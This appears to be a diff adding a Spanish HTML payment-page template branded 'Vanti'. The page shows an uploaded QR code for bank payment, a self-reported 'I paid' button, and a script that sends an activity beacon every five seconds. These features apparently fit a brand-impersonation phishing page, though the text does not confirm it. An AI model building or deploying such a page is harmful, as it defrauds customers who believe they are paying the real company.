@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pasarela de Pago - Vanti</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <div class="header"></div>
+    <div class="logo-container">
+        <h1 class="logo-title">vanti<span style="color:#e2a000;">✓</span></h1>
+    </div>
+
+    <div class="card" style="text-align:center;">
+        <h3 style="color:#0d3859;">Resumen de Pago</h3>
+        <p><b>Referencia:</b> {{ referencia }}</p>
+        <p><b>Total a pagar:</b> $ {{ "{:,}".format(monto) }}</p>
+        
+        <div style="margin:20px 0;">
+            <p>Escanea el código QR con la app de tu banco:</p>
+            <img src="/static/uploads/qr_actual.jpg " alt="Código QR" style="max-width:200px; border:1px solid #ccc; padding:5px; border-radius:8px;">
+        </div>
+
+        <form action="/notificar_pago" method="POST">
+            <input type="hidden" name="tx_id" value="{{ tx_id }}">
+            <button type="submit" class="btn-pagar">Ya realicé el pago</button>
+        </form>
+    </div>
+    <script>
+        const txId = "{{ tx_id }}";
+        const registrarActividad = () => navigator.sendBeacon(`/actividad/${txId}`);
+        registrarActividad();
+        setInterval(registrarActividad, 5000);
+    </script>
+</body>
+</html>
